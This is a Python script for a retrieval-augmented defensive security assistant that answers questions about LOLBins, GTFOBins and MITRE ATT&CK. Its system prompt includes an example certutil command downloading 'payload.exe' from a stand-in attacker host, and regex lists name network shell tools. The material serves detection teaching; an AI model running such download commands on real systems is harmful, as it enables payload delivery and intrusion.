"""
LOTL Assistant — RAG with classification + hybrid search + reranking.
Usage:
    python assistant.py "your question"
    python assistant.py                (interactive)
"""

import os
import sys
import re
import chromadb
import ollama
from chromadb.utils import embedding_functions
from sentence_transformers import CrossEncoder

# ============ CONFIG ============
CHROMA_HOST     = "localhost"
CHROMA_PORT     = 8000
EMBED_MODEL     = "BAAI/bge-small-en-v1.5"
RERANK_MODEL    = "cross-encoder/ms-marco-MiniLM-L-6-v2"
LLM_MODEL       = "deepseek-r1:14b"
TOP_K           = 5
CANDIDATES      = 25
VAULT_BASE      = r"D:\GARUDA\obsidian_vault\MITRE_ATTACK"
# ================================

SYSTEM_PROMPT = """You are GARUDA, a defensive cybersecurity assistant specializing in Living Off the Land (LOTL), LOLBins, detection engineering, and MITRE ATT&CK.

Answer format (ALWAYS, no exceptions):

**Summary**
One or two sentences answering the question directly.

## Details
Bullets, commands, tables. Use `##` headers to organize.

## Detection
Concrete detection guidance: Sigma rule names, Event IDs, command-line patterns.

## References
- [Note title] — collection/note_name
- [Another note] — collection/note_name

Hard rules:
1. Synthesize a NEW answer. Do NOT copy raw notes verbatim.
2. NEVER output [^fn1], YAML frontmatter, [[wikilinks]], or `tags:` blocks.
3. NEVER invent URLs. If a URL is malformed, omit it.
4. If context is insufficient, say so. Do not hallucinate.
5. Stay in scope: LOTL, LOLBins, GTFOBins, MITRE ATT&CK, Sigma, CTI.
6. Do not echo the user's question back.

Example:

User: How do attackers use certutil?

**Summary**
certutil.exe is a signed Windows utility abused for payload download and base64 decoding — a classic LOTL downloader.

## Details
- Download: `certutil -urlcache -split -f http://attacker/payload.exe payload.exe`
- Decode: `certutil -decode encoded.txt payload.exe`

## Detection
- Sigma: `proc_creation_win_certutil_download`
- Event ID 4688: certutil.exe with `-urlcache` and network egress to non-Microsoft hosts.

## References
- certutil — lolbins/certutil
- T1105 Ingress Tool Transfer — MITRE_ATTACK/techniques/T1105
"""

# Post-processors applied to every model reply
FOOTNOTE_RE = re.compile(r"\[\^[^\]]+\]")
WIKILINK_RE = re.compile(r"\[\[([^\]|]+)(?:\|([^\]]+))?\]\]")
YAML_FM_RE  = re.compile(r"^---\s*\n.*?\n---\s*\n", re.DOTALL)


# ---------- Load malware & tool names dynamically ----------
def load_names():
    malware, tools = set(), set()
    for folder, target in [("Malwares", malware), ("Tools", tools)]:
        folder_path = os.path.join(VAULT_BASE, folder)
        if not os.path.isdir(folder_path):
            continue
        for fn in os.listdir(folder_path):
            if fn.endswith(".md"):
                name = fn[:-3].lower().strip()
                # Normalize: strip non-alphanumerics for matching
                norm = re.sub(r"[^a-z0-9]", "", name)
                if len(norm) >= 4:  # skip tiny names to avoid false positives
                    target.add((norm, name))
    return malware, tools

MALWARE_NAMES, TOOL_NAMES = load_names()

# ---------- Patterns (Windows binaries) ----------
BINARY_PATTERN = re.compile(
    r"\b(certutil|mshta|rundll32|regsvr32|wmic|powershell|bitsadmin|msbuild|"
    r"installutil|schtasks|vssadmin|wbadmin|nslookup|netsh|cmstp|cscript|"
    r"wscript|xcopy|reg\.exe|cmdkey|cmdl32|esentutl|eventvwr|expand|extrac32|"
    r"findstr|forfiles|fsutil|ftp|gpscript|certoc|certreq|pcalua|pcwrun|"
    r"presentationhost|replace|rpcping|runonce|sc\.exe|scriptrunner|tttracer|"
    r"verclsid|wsl|wsreset|msiexec|odbcconf|regasm|regsvcs|mavinject|xwizard)"
    r"(\.exe)?\b",
    re.IGNORECASE,
)

# ---------- Patterns (Unix / GTFOBins) ----------
UNIX_BINARIES = re.compile(
    r"\b(bash|sh|zsh|dash|ksh|fish|"
    r"python3?|perl|ruby|node|php|"
    r"curl|wget|nc|ncat|netcat|socat|telnet|"
    r"find|awk|sed|grep|tar|zip|unzip|"
    r"nmap|ssh|scp|rsync|sftp|"
    r"vim|vi|nano|emacs|less|more|"
    r"systemctl|journalctl|crontab|"
    r"dd|cp|mv|ln|chmod|chown|"
    r"env|nohup|watch|xargs|taskset|"
    r"docker|kubectl|ansible|"
    r"openssl|gpg|ssh-keygen|"
    r"apt|yum|dnf|pacman|npm)\b",
    re.IGNORECASE,
)

# ---------- Detection keywords ----------
DETECTION_KEYWORDS = re.compile(
    r"\b(detect|detection|sigma|rule|alert|trigger|"
    r"log source|event id|sysmon|audit|indicator|"
    r"how to catch|how to spot|how to detect|"
    r"rule for|rules for)\b",
    re.IGNORECASE,
)
CAMPAIGN_KEYWORDS = re.compile(
    r"\b(scenario|campaign|real-world|attack chain|chain of|"
    r"how do attackers chain|show me an attack|multi-step|"
    r"walk me through|step.by.step|real attack)\b",
    re.IGNORECASE,
)

# ---------- MITRE technique IDs ----------
TECHNIQUE_PATTERN = re.compile(r"\bT\d{4}(\.\d{3})?\b", re.IGNORECASE)

# ---------- Out-of-scope detector ----------
OUT_OF_SCOPE = [
    "my computer", "my pc", "my laptop", "why is my",
    "computer is slow", "won't boot", "will not boot",
    "wifi not working", "how do i fix", "how to fix my",
    "windows update stuck", "blue screen", "bsod",
    "printer not working", "email not sending",
]


def classify_query(q: str):
    """Route the query to the best collection."""
    ql = q.lower()

    # 0. Out-of-scope
    if any(phrase in ql for phrase in OUT_OF_SCOPE):
        return "OUT_OF_SCOPE", None

    # 1. Technique ID
    m = TECHNIQUE_PATTERN.search(q)
    if m:
        return "techniques", m.group(0).upper()

    # 2. Detection queries
    if DETECTION_KEYWORDS.search(q):
        m = BINARY_PATTERN.search(q)
        if m:
            return "detection_rules", m.group(1).lower().replace(".exe", "")
        m = UNIX_BINARIES.search(q)
        if m:
            return "detection_rules", m.group(1).lower()
        return "detection_rules", None

    # 3. Campaign/scenario queries
    if CAMPAIGN_KEYWORDS.search(q):
        return "campaigns", None

    # 4. Windows binaries FIRST (before tool/malware name lookup)
    m = BINARY_PATTERN.search(q)
    if m:
        return "lolbins", m.group(1).lower().replace(".exe", "")

    # 5. Unix binaries
    m = UNIX_BINARIES.search(q)
    if m:
        return "gtfobins", m.group(1).lower()

    # 6. Specific malware/tool names (AFTER binaries)
    ql_norm = re.sub(r"[^a-z0-9]", "", ql)
    for norm, original in MALWARE_NAMES:
        if norm in ql_norm:
            return "malware", original
    for norm, original in TOOL_NAMES:
        if norm in ql_norm:
            return "tools", original

    # 7. Generic malware keywords
    if any(w in ql for w in ["malware", "trojan", "ransomware", "backdoor", "rat "]):
        return "malware", None

    # 8. Capability phrases
    if any(w in ql for w in ["download file", "download files", "fetch file",
                              "fetch files", "built-in tool", "built-in binary",
                              "system binary", "encode file", "decode file"]):
        return "lolbins", None

    # 9. Tools / tactics
    if any(w in ql for w in ["mitre tool", "attack tool", "utility software"]):
        return "tools", None
    if any(w in ql for w in ["tactic", "phase", "stage", "kill chain"]):
        return "tactics", None

    # 10. Default
    return "techniques", None


_reranker = None
def get_reranker():
    global _reranker
    if _reranker is None:
        _reranker = CrossEncoder(RERANK_MODEL)
    return _reranker


_client = None
_embed_fn = None
def get_client():
    global _client
    if _client is None:
        _client = chromadb.HttpClient(host=CHROMA_HOST, port=CHROMA_PORT)
    return _client

def get_embed_fn():
    global _embed_fn
    if _embed_fn is None:
        _embed_fn = embedding_functions.SentenceTransformerEmbeddingFunction(
            model_name=EMBED_MODEL
        )
    return _embed_fn


def retrieve(question, collection_name, entity, top_k=TOP_K, candidates=CANDIDATES):
    client = get_client()
    embed_fn = get_embed_fn()
    try:
        coll = client.get_collection(name=collection_name, embedding_function=embed_fn)
    except Exception:
        coll = client.get_collection(name="techniques", embedding_function=embed_fn)

    # Exact technique ID match
    if entity and re.match(r"^T\d{4}(\.\d{3})?$", entity):
        print(f"   [using exact ID match for {entity}]")
        try:
            results = coll.get(
                where={"technique_id": entity},
                limit=candidates,
                include=["documents", "metadatas"],
            )
            id_docs = results["documents"]
            id_metas = results["metadatas"]
            if id_docs:
                top = list(zip(id_docs, id_metas))[:top_k]
                return [t[0] for t in top], [t[1] for t in top]
        except Exception as e:
            print(f"   [ID filter failed: {e}]")

    # Filename match for specific malware/tool names (exact match)
    if entity and collection_name in ("malware", "tools", "lolbins", "gtfobins"):
        try:
            results = coll.get(
                where={"filename": entity},
                limit=candidates,
                include=["documents", "metadatas"],
            )
            f_docs = results["documents"]
            f_metas = results["metadatas"]
            if f_docs:
                top = list(zip(f_docs, f_metas))[:top_k]
                return [t[0] for t in top], [t[1] for t in top]
        except Exception as e:
            # silent fallback to semantic search, but log so we notice schema drift
            print(f"   [filename lookup skipped: {e}]")

    # Semantic search + rerank
    n_fetch = max(candidates, 50) if collection_name == "campaigns" else candidates
    results = coll.query(query_texts=[question], n_results=n_fetch)
    docs = results["documents"][0]
    metas = results["metadatas"][0]

    if not docs:
        return [], []

    reranker = get_reranker()
    pairs = [(question, d) for d in docs]
    scores = reranker.predict(pairs)

    scored = []
    ent_l = entity.lower() if entity else None
    for doc, meta, score in zip(docs, metas, scores):
        bonus = 0.0
        if ent_l:
            if ent_l in meta.get("source", "").lower():
                bonus += 5.0
            if ent_l in doc.lower():
                bonus += 1.0
        scored.append((score + bonus, doc, meta))

    scored.sort(key=lambda x: -x[0])

    # Dedupe by source — max 2 chunks per note
    MAX_PER_SOURCE = 2
    picked = []
    per_source_count = {}
    for score, doc, meta in scored:
        src = meta.get("source", "?")
        if per_source_count.get(src, 0) >= MAX_PER_SOURCE:
            continue
        picked.append((score, doc, meta))
        per_source_count[src] = per_source_count.get(src, 0) + 1
        if len(picked) >= top_k:
            break

    # For campaigns, force-include Detection/Mitigation chunks from top sources
    if collection_name == "campaigns" and picked:
        seen = {t[1] for t in picked}
        top_sources = list({t[2].get("source") for t in picked})[:3]

        for src in top_sources:
            try:
                extra = coll.get(
                    where={"source": src},
                    limit=15,
                    include=["documents", "metadatas"],
                )
                for doc, meta in zip(extra["documents"], extra["metadatas"]):
                    if doc in seen:
                        continue
                    if any(kw in doc for kw in [
                        "## Detection", "## Mitigation",
                        "Detection Logic", "Mitigation",
                        "detection:", "mitigation:",
                    ]):
                        picked.append((0, doc, meta))
                        seen.add(doc)
            except Exception:
                pass

        picked = picked[:12]

    return [t[1] for t in picked], [t[2] for t in picked]


def strip_thinking(text: str) -> str:
    """Remove <think>...</think> blocks and orphan tags from DeepSeek-R1 output."""
    text = re.sub(r"<think>.*?</think>", "", text, flags=re.DOTALL)
    # Orphaned opening OR closing tags (model sometimes truncates one side)
    text = re.sub(r"</?think>", "", text)
    return text.strip()


def strip_bad_urls(text: str) -> str:           # ← NEW, insert here
    """Remove or repair malformed URLs from the reply."""
    text = re.sub(r"https?://\S*(?:\.\.\.|\[…\]|…)\S*", "", text)
    text = re.sub(r"https?://(?=\s|$)", "", text)
    text = re.sub(r"(https?://\S+)[.,;:!?](?=\s|$)", r"\1", text)
    return text

def clean_reply(text: str) -> str:
    """Apply all post-processors to a raw model reply."""
    text = strip_thinking(text)
    text = FOOTNOTE_RE.sub("", text)         # kill [^fn1] leftovers
    # Unwrap Obsidian wikilinks: [[target|label]] -> label, [[target]] -> target
    text = WIKILINK_RE.sub(lambda m: m.group(2) or m.group(1), text)
    text = strip_bad_urls(text)          # ← add this line
    text = re.sub(r"[ \t]+\n", "\n", text)   # trim trailing spaces
    text = re.sub(r"\n{3,}", "\n\n", text)   # collapse blank lines
    return text.strip()


def ask_llm(question, context, collection_used):
    user_prompt = f"""Retrieved from collection '{collection_used}'.

Context:

{context}

---

Question: {question}

Answer using only the context above."""

    response = ollama.chat(
        model=LLM_MODEL,
        messages=[
            {"role": "system", "content": SYSTEM_PROMPT},
            {"role": "user", "content": user_prompt},
        ],
        options={"num_predict": 4096},
    )

    msg = getattr(response, "message", None) or response["message"]
    content  = getattr(msg, "content",  "") or ""
    thinking = getattr(msg, "thinking", "") or ""
    
    raw = content if content.strip() else thinking

    return clean_reply(raw)


def build_context(docs, metas):
    parts = []
    for i, (doc, meta) in enumerate(zip(docs, metas), start=1):
        src = meta.get("source", "unknown")
        parts.append(f"[Chunk {i}] source={src}\n{doc}")
    return "\n\n---\n\n".join(parts)

REFERENCES_HEADER_RE = re.compile(
    r"^[ \t]*[#*_> \t]*(?:references|sources)[ \t*_:]*$",
    re.IGNORECASE | re.MULTILINE,
)

def ensure_references(reply: str, metas) -> str:
    """If the model didn't emit a References section, append one built
    from the actual retrieved sources. Deterministic, always accurate."""
    if not reply:
        return reply
    if REFERENCES_HEADER_RE.search(reply):
        return reply  # model provided one — trust it

    seen, lines = set(), []
    for meta in metas:
        src = meta.get("source", "").strip()
        if src and src not in seen:
            seen.add(src)
            lines.append(f"- {src}")

    if not lines:
        return reply

    return reply.rstrip() + "\n\n## References\n" + "\n".join(lines) + "\n"

def rewrite_query(question, history):
    """
    Rewrite a follow-up question into a standalone search query using
    conversation history. Returns the original if no rewrite is needed.
    """
    if not history:
        return question

    # Skip only if the query already contains a specific tool name or technique ID
    # (true standalone queries). Do NOT skip topic-switch phrases like "now tell me about X"
    if re.search(r"\bT\d{4}(\.\d{3})?\b", question):
        return question

    # Build short conversation context
    convo = "\n".join(
        f"{m['role'].capitalize()}: {m['content'][:150]}"
        for m in history[-4:]
    )

    prompt = f"""You are a query rewriter. Rewrite the user's latest message into
a short standalone search query for a cybersecurity knowledge base.

Rules:
- Output ONLY the rewritten query — no prefix, no quotes, no explanation.
- Keep it under 20 words.
- Include the tool/technique name from context if the message uses "that", "it", or "this".

Conversation:
{convo}

Latest message: {question}

Rewritten query:"""

    try:
        resp = ollama.chat(
            model="llama3.1:8b",
            messages=[{"role": "user", "content": prompt}],
            options={"num_predict": 40, "temperature": 0.1},
        )
        msg = getattr(resp, "message", None) or resp["message"]
        rewritten = (getattr(msg, "content", "") or "").strip()
        if not rewritten:
            rewritten = (getattr(msg, "thinking", "") or "").strip()

        # Take the last non-empty line (LLM sometimes adds a preamble)
        lines = [ln.strip() for ln in rewritten.split("\n") if ln.strip()]
        if lines:
            rewritten = lines[-1]

        # Strip common prefixes and quotes
        rewritten = re.sub(
            r"^(?:rewritten query|standalone query|query|rewritten)[:\s]*",
            "", rewritten, flags=re.I,
        )
        rewritten = rewritten.strip('"\'' + "`").strip()

        # Debug line so we can see what it produced
        print(f"   [rewrite] '{question}' -> '{rewritten}'")

        if 3 < len(rewritten) < 200:
            return rewritten
        else:
            print(f"   [rewrite REJECTED] len={len(rewritten)}")
    except Exception as e:
        print(f"   [query rewrite failed: {e}]")

    return question

def answer(question, verbose=True):
    """
    Run the full pipeline. Prints progress when verbose.
    Returns (reply_text, sources_list) or (None, []) on out-of-scope / no results.
    """
    collection, entity = classify_query(question)
    if verbose:
        print(f"\n🔍 Question: {question}")

    if collection == "OUT_OF_SCOPE":
        msg = "❌ This assistant only answers LOTL / cybersecurity questions."
        if verbose:
            print(msg)
        return None, []

    if verbose:
        print(f"📂 Collection: {collection}" + (f"  |  Entity: {entity}" if entity else ""))
        print("⏳ Retrieving...")

    k = 8 if collection == "campaigns" else TOP_K
    docs, metas = retrieve(question, collection, entity, top_k=k)
    if not docs:
        if verbose:
            print("❌ No results found.")
        return None, []

    if verbose:
        print(f"✓ Retrieved {len(docs)} chunks (post-rerank)")
        print("🧠 Generating answer...\n")

    context = build_context(docs, metas)
    reply = ask_llm(question, context, collection)
    reply = ensure_references(reply, metas)      # ← new

    if verbose:
        print("=" * 72)
        print(reply)
        print("=" * 72)
        print("\n📚 Sources:")
        seen = set()
        for meta in metas:
            src = meta.get("source", "unknown")
            if src not in seen:
                seen.add(src)
                print(f"  - {src}")

    sources = []
    seen = set()
    for meta in metas:
        src = meta.get("source", "unknown")
        if src not in seen:
            seen.add(src)
            sources.append(src)

    return reply, sources


def interactive():
    print("LOTL Assistant. Type 'exit' to quit.\n")
    while True:
        try:
            q = input("You: ").strip()
        except (EOFError, KeyboardInterrupt):
            print(); break
        if not q or q.lower() in ("exit", "quit"):
            break
        try:
            answer(q)
        except Exception as e:
            print(f"\n⚠️  Error: {e}\n")


def main():
    if len(sys.argv) > 1:
        answer(" ".join(sys.argv[1:]))
    else:
        interactive()


if __name__ == "__main__":
    main()